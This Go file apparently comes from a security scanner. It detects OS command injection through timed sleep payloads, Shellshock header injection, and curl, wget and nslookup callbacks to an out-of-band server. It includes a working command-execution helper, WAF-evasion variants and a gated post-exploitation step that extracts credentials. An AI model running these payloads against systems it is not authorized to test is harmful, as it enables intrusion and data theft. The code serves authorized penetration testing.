// Package cmdinj implements an OS command injection scanner with two detection
// modes and a post-exploitation pipeline:
//
// 1. Timing-based detection: calibrated sleep injection in query parameters
//    (baseline → sleep 3 → verify delta > 2.5s → sleep 5 → proportional confirm)
//
// 2. Shellshock detection (CVE-2014-6271): crafted function definitions in HTTP
//    headers sent to CGI endpoints — marker string in response confirms execution
//
// Post-exploitation (ScanAuthorized only): after confirming command injection,
// runs reconnaissance (env, /etc/hosts, ARP, ifconfig), discovers internal hosts,
// probes for services (Redis, Elasticsearch, databases), and extracts data/creds
// through the injection point.
//
// Detection runs at ScanDeep; post-exploitation requires ScanAuthorized.
package cmdinj

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/evasion"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
	"github.com/stormbane-security/beacon/internal/postexploit"
	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
)

func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	},
		scan.Check(finding.CheckWebCmdInjection, finding.SeverityCritical, finding.ModeDeep),
	)
}

const (
	scannerName     = "cmdinj"
	shellshockMark  = "BEACON_CMDINJ_8f3a2c"
)

type payload struct {
	name    string // human label
	os      string // unix, windows, any
	prefix  string // injected before the sleep command
	sleepFn string // sleep command template (%d = seconds)
	suffix  string // injected after
}

var payloads = []payload{
	// Unix — various injection contexts
	{name: "unix-semi", os: "unix", prefix: "; sleep ", sleepFn: "%d", suffix: " #"},
	{name: "unix-pipe", os: "unix", prefix: "| sleep ", sleepFn: "%d", suffix: ""},
	{name: "unix-backtick", os: "unix", prefix: "`sleep ", sleepFn: "%d", suffix: "`"},
	{name: "unix-subshell", os: "unix", prefix: "$(sleep ", sleepFn: "%d", suffix: ")"},
	{name: "unix-newline", os: "unix", prefix: "\nsleep ", sleepFn: "%d", suffix: "\n"},
	{name: "unix-and", os: "unix", prefix: "&& sleep ", sleepFn: "%d", suffix: ""},
	{name: "unix-or", os: "unix", prefix: "|| sleep ", sleepFn: "%d", suffix: ""},

	// Windows
	{name: "win-and-ping", os: "windows", prefix: "& ping -n ", sleepFn: "%d", suffix: " 127.0.0.1 >nul"},
	{name: "win-pipe-ping", os: "windows", prefix: "| ping -n ", sleepFn: "%d", suffix: " 127.0.0.1 >nul"},
	{name: "win-timeout", os: "windows", prefix: "& timeout /t ", sleepFn: "%d", suffix: " >nul"},
}

// probePaths are paths and parameters commonly vulnerable to command injection.
var probePaths = []struct {
	path   string
	params []string
}{
	{"/", []string{"cmd", "exec", "command", "run", "ping", "host", "ip", "domain", "address", "query", "input", "filename", "path", "target"}},
	{"/api/v1/ping", []string{"host", "target", "ip"}},
	{"/admin/backup", []string{"file", "path", "dir"}},
	{"/tools/lookup", []string{"domain", "host", "ip", "target"}},
	{"/api/health", []string{"check", "host"}},
	{"/ping", []string{"host", "ip", "target", "domain", "address"}},
	{"/nslookup", []string{"host", "domain", "target", "query"}},
	{"/dig", []string{"host", "domain", "target", "query"}},
	{"/traceroute", []string{"host", "ip", "target", "domain", "address"}},
	{"/exec", []string{"cmd", "command", "input", "query"}},
	{"/run", []string{"cmd", "command", "input", "query"}},
	{"/cmd", []string{"cmd", "command", "input", "query", "host", "ip"}},
	{"/shell", []string{"cmd", "command", "input", "query"}},
	{"/test", []string{"host", "ip", "cmd", "command", "target", "domain", "input"}},
	{"/check", []string{"host", "ip", "target", "domain", "address"}},
	{"/api/exec", []string{"cmd", "command", "host", "ip", "target", "input"}},
	{"/api/run", []string{"cmd", "command", "host", "ip", "target", "input"}},
	{"/tools", []string{"host", "ip", "cmd", "command", "domain", "target", "query", "input"}},
	{"/admin/exec", []string{"cmd", "command", "host", "ip", "target", "input"}},
	{"/system", []string{"cmd", "command", "host", "ip", "target", "input", "filename", "path"}},
	{"/api", []string{"cmd", "command", "host", "ip", "target", "domain", "input"}},
	{"/api/v1", []string{"cmd", "command", "host", "ip", "target", "domain", "input"}},
	{"/api/v2", []string{"cmd", "command", "host", "ip", "target", "domain", "input"}},
}

// shellshockPaths are CGI paths commonly vulnerable to Shellshock.
var shellshockPaths = []string{
	"/cgi-bin/vulnerable",
	"/cgi-bin/test",
	"/cgi-bin/status",
	"/cgi-bin/bash",
	"/cgi-bin/env",
	"/cgi-bin/",
}

// shellshockHeaders are HTTP headers to test for Shellshock injection.
var shellshockHeaders = []string{
	"User-Agent",
	"Referer",
	"Cookie",
}

// Scanner checks for OS command injection via timing analysis and Shellshock.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := authctx.HTTPClient(ctx)
	// Ensure TLS verification is skipped and timeout is set,
	// while preserving the auth client's transport (bearer tokens, cookies, etc.).
	if client.Timeout == 0 {
		client.Timeout = 30 * time.Second
	}
	if client.Transport == nil {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		}
	}

	scheme := detectScheme(ctx, client, asset)
	if scheme == "" {
		return nil, nil
	}

	var findings []finding.Finding

	// Phase 1: Shellshock detection (CVE-2014-6271)
	shellFindings := s.shellshockProbe(ctx, client, scheme, asset, scanType)
	findings = append(findings, shellFindings...)

	// Phase 2: Timing-based parameter injection
	paramFindings := s.timingProbe(ctx, client, scheme, asset, scanType)
	findings = append(findings, paramFindings...)

	// Web exploit dispatcher: run post-exploit chains with per-module approval.
	if scanType == module.ScanAuthorized && len(findings) > 0 {
		dispatcher := postexploit.NewWebExploitDispatcher()
		approveFunc := postexploit.ApproveFuncFromContext(ctx)
		fb := &postexploit.FindingBuilder{
			Module:  "deep",
			Scanner: scannerName,
			Asset:   asset,
		}
		for _, f := range findings {
			if ctx.Err() != nil {
				break
			}
			if dispatcher.CanExploit(f.CheckID) {
				if approveFunc == nil || !approveFunc("web-exploit-"+string(f.CheckID), asset, 0) {
					continue
				}
				exploitFindings := dispatcher.Dispatch(ctx, f, fb)
				findings = append(findings, exploitFindings...)
			}
		}
	}

	return findings, nil
}

// shellshockProbe detects Shellshock (CVE-2014-6271) by injecting function
// definitions into HTTP headers sent to CGI endpoints.
func (s *Scanner) shellshockProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
	var findings []finding.Finding

	for _, path := range shellshockPaths {
		for _, header := range shellshockHeaders {
			if ctx.Err() != nil {
				return findings
			}

			targetURL := fmt.Sprintf("%s://%s%s", scheme, asset, path)
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
			if err != nil {
				continue
			}

			// Shellshock payload: bash function definition followed by command.
			// The () { :;}; pattern exploits CVE-2014-6271 where bash processes
			// trailing commands in function definitions stored in env vars.
			shellPayload := fmt.Sprintf("() { :;}; echo; echo %s", shellshockMark)
			req.Header.Set(header, shellPayload)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			_ = resp.Body.Close()

			if !strings.Contains(string(body), shellshockMark) {
				continue
			}

			findings = append(findings, finding.Finding{
				CheckID:  finding.CheckWebCmdInjection,
				Module:   "deep",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Title:    fmt.Sprintf("Shellshock (CVE-2014-6271): command injection via %s on %s", header, path),
				Description: fmt.Sprintf(
					"The CGI endpoint at %s is vulnerable to Shellshock (CVE-2014-6271). "+
						"Commands injected via the %s header are executed by the server and "+
						"output is returned in the response body. This allows arbitrary "+
						"command execution on the server.",
					path, header),
				Asset:    asset,
				DeepOnly: true,
				Evidence: map[string]any{
					"path":          path,
					"header":        header,
					"cve":           "CVE-2014-6271",
					"marker_echoed": true,
				},
				ProofCommand: fmt.Sprintf(
					`curl -s -H '%s: () { :;}; echo; /bin/id' '%s'`,
					header, targetURL),
				DiscoveredAt: time.Now(),
			})

			// Post-exploitation: only in authorized mode.
			if scanType == module.ScanAuthorized {
				execCmd := func(cmd string) (string, error) {
					return shellshockExec(ctx, client, targetURL, header, cmd)
				}
				postFindings := postExploit(ctx, execCmd, asset, path, header)
				findings = append(findings, postFindings...)
			}

			// One confirmed Shellshock finding is enough — stop all probes.
			return findings
		}
	}

	return findings
}

// shellshockExec executes a command through a confirmed Shellshock injection
// point and returns the command output.
func shellshockExec(ctx context.Context, client *http.Client, targetURL, header, cmd string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return "", err
	}

	// Wrap command in /bin/bash -c for reliable execution.
	// Escape single quotes in cmd to prevent shell injection.
	escaped := strings.ReplaceAll(cmd, "'", `'\''`)
	shellPayload := fmt.Sprintf("() { :;}; echo; /bin/bash -c '%s'", escaped)
	req.Header.Set(header, shellPayload)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer func() { _ = resp.Body.Close() }()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(string(body)), nil
}

// timingProbe detects command injection via calibrated sleep timing on query
// parameters. Same logic as before, factored into its own method.
func (s *Scanner) timingProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
	var findings []finding.Finding

	// Merge discovered parameters from crawl results into the hardcoded probe list.
	effectiveProbePaths := probePaths
	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
		effectiveProbePaths = mergeDiscoveredCmdInj(probePaths, discovered)
	}

	for _, pp := range effectiveProbePaths {
		if ctx.Err() != nil {
			break
		}

		for _, param := range pp.params {
			if ctx.Err() != nil {
				break
			}

			baseURL := fmt.Sprintf("%s://%s%s?%s=test", scheme, asset, pp.path, param)
			baseline, err := measureBaseline(ctx, client, baseURL, 5)
			if err != nil {
				continue
			}

			for _, p := range payloads {
				if ctx.Err() != nil {
					break
				}

				injected3 := buildPayload(p, 3)

				// Build candidate list: original payload + WAF evasion variants.
				candidates := []string{injected3}
				if p.os == "unix" {
					candidates = append(candidates, evasion.CmdBypass(injected3)...)
				}

				var confirmedURL3 string
				var confirmedDelta3 time.Duration
				var confirmedLabel string
				var confirmedIdx int

				for ci, candidate := range candidates {
					if ctx.Err() != nil {
						break
					}
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+candidate))
					latency, err := timeRequest(ctx, client, testURL)
					if err != nil {
						continue
					}
					delta := latency - baseline
					if delta >= 2500*time.Millisecond {
						confirmedURL3 = testURL
						confirmedDelta3 = delta
						confirmedIdx = ci
						if ci == 0 {
							confirmedLabel = p.name
						} else {
							confirmedLabel = fmt.Sprintf("%s+evasion-%d", p.name, ci)
						}
						break
					}
				}

				if confirmedURL3 == "" {
					continue
				}

				// Confirm with sleep(5). Use the same evasion variant that
				// worked for sleep(3), otherwise a WAF blocks the confirmation.
				injected5 := buildPayload(p, 5)
				candidates5 := []string{injected5}
				if p.os == "unix" {
					candidates5 = append(candidates5, evasion.CmdBypass(injected5)...)
				}
				confirm5 := injected5
				if confirmedIdx < len(candidates5) {
					confirm5 = candidates5[confirmedIdx]
				}
				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+confirm5))
				latency5, err := timeRequest(ctx, client, testURL5)
				if err != nil {
					continue
				}

				delta5 := latency5 - baseline
				if delta5 < 4500*time.Millisecond {
					continue
				}

				// Proportional delta check: sleep(5) should be ~2s longer than
				// sleep(3). If both deltas are similar, the delay is from WAF
				// throttling or network latency, not command execution.
				// Real injection: delta5 - delta3 ≈ 2000ms (±500ms)
				// WAF/network: delta5 ≈ delta3 (difference < 1000ms)
				deltaDiff := delta5 - confirmedDelta3
				if deltaDiff < 1000*time.Millisecond {
					continue
				}

				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebCmdInjection,
					Module:   "deep",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Title:    fmt.Sprintf("OS command injection in %s parameter at %s", param, pp.path),
					Description: fmt.Sprintf(
						"Calibration-based timing confirmed command injection. "+
							"Baseline: %s, sleep(3) delta: %s, sleep(5) delta: %s. "+
							"OS type: %s. Payload: %s",
						baseline.Round(time.Millisecond), confirmedDelta3.Round(time.Millisecond),
						delta5.Round(time.Millisecond), p.os, confirmedLabel),
					Asset:    asset,
					DeepOnly: true,
					Evidence: map[string]any{
						"path":            pp.path,
						"parameter":       param,
						"payload":         confirmedLabel,
						"os_type":         p.os,
						"baseline_ms":     baseline.Milliseconds(),
						"sleep3_delta_ms": confirmedDelta3.Milliseconds(),
						"sleep5_delta_ms": delta5.Milliseconds(),
						"waf_bypass":      confirmedLabel != p.name,
					},
					ProofCommand: fmt.Sprintf(
						`time curl -sk '%s'  # should take ~3s longer than baseline`,
						confirmedURL3),
					DiscoveredAt: time.Now(),
				})
				break // one per parameter
			}

			// OOB confirmation — blind command injection where output is not
			// reflected in the response. Uses both DNS (nslookup) and HTTP
			// (curl/wget) callbacks for maximum coverage.
			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
				token := oob.MakeToken(oobSrv, "cmdinj", asset, fmt.Sprintf("oob-%s-%s", pp.path, param))
				oobDomain := oob.PayloadDNS(oobSrv, token)
				oobURL := oob.PayloadURL(oobSrv, token)

				oobPayloads := []string{
					// DNS-based (nslookup)
					fmt.Sprintf("; nslookup %s #", oobDomain),
					fmt.Sprintf("| nslookup %s", oobDomain),
					fmt.Sprintf("$(nslookup %s)", oobDomain),
					fmt.Sprintf("& nslookup %s", oobDomain),
					// HTTP-based (curl)
					fmt.Sprintf("; curl %s #", oobURL),
					fmt.Sprintf("| curl %s", oobURL),
					fmt.Sprintf("$(curl %s)", oobURL),
					// HTTP-based (wget)
					fmt.Sprintf("| wget %s -O /dev/null", oobURL),
					fmt.Sprintf("; wget %s -O /dev/null #", oobURL),
				}

				for _, op := range oobPayloads {
					if ctx.Err() != nil {
						break
					}
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+op))
					_, _ = timeRequest(ctx, client, testURL)
				}

				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
					findings = append(findings, finding.Finding{
						CheckID:    finding.CheckWebCmdInjection,
						Module:     "deep",
						Scanner:    scannerName,
						Severity:   finding.SeverityCritical,
						Confidence: finding.ConfidenceVerified,
						Title:      fmt.Sprintf("Blind command injection confirmed via OOB callback in %s at %s", param, pp.path),
						Description: fmt.Sprintf(
							"Out-of-band callback received from %s after injecting curl/wget/nslookup "+
								"commands, confirming blind OS command injection. The injected command "+
								"executed on the server and made a %s request to the OOB callback server. "+
								"Output was not reflected in the HTTP response.",
							cb.RemoteAddr, cb.Protocol),
						Asset:    asset,
						DeepOnly: true,
						Evidence: map[string]any{
							"method":      "blind-oob",
							"path":        pp.path,
							"parameter":   param,
							"oob_token":   token,
							"callback_ip": cb.RemoteAddr,
							"protocol":    cb.Protocol,
						},
						ProofCommand: fmt.Sprintf(
							`curl -sk '%s://%s%s?%s=%s'`,
							scheme, asset, pp.path, param,
							url.QueryEscape(fmt.Sprintf("test; curl %s #", oobURL))),
						DiscoveredAt: time.Now(),
					})
				}
			}
		}
	}

	return findings
}

func buildPayload(p payload, seconds int) string {
	s := seconds
	// Windows ping -n N sends N packets with 1-second intervals between them,
	// so it takes N-1 seconds. Add 1 to compensate.
	if p.os == "windows" && strings.Contains(p.prefix, "ping") {
		s++
	}
	sleep := fmt.Sprintf(p.sleepFn, s)
	return p.prefix + sleep + p.suffix
}

func measureBaseline(ctx context.Context, client *http.Client, rawURL string, n int) (time.Duration, error) {
	var latencies []time.Duration
	for i := 0; i < n; i++ {
		d, err := timeRequest(ctx, client, rawURL)
		if err != nil {
			return 0, err
		}
		latencies = append(latencies, d)
	}
	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
	return latencies[len(latencies)/2], nil
}

func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.Duration, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-cmdinj-scanner)")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return elapsed, err
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	return elapsed, nil
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	for _, scheme := range []string{"https", "http"} {
		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		_ = resp.Body.Close()
		return scheme
	}
	return ""
}

// mergeDiscoveredCmdInj combines hardcoded probe paths with parameters
// discovered from crawl results.
func mergeDiscoveredCmdInj(hardcoded []struct{ path string; params []string }, discovered map[string][]string) []struct{ path string; params []string } {
	result := make([]struct{ path string; params []string }, len(hardcoded))
	pathIdx := make(map[string]int, len(hardcoded))
	for i, pp := range hardcoded {
		params := make([]string, len(pp.params))
		copy(params, pp.params)
		result[i] = struct{ path string; params []string }{path: pp.path, params: params}
		pathIdx[pp.path] = i
	}

	for path, newParams := range discovered {
		if idx, ok := pathIdx[path]; ok {
			existing := make(map[string]bool, len(result[idx].params))
			for _, p := range result[idx].params {
				existing[p] = true
			}
			for _, p := range newParams {
				if !existing[p] {
					result[idx].params = append(result[idx].params, p)
					existing[p] = true
				}
			}
		} else {
			result = append(result, struct{ path string; params []string }{path: path, params: newParams})
		}
	}
	return result
}
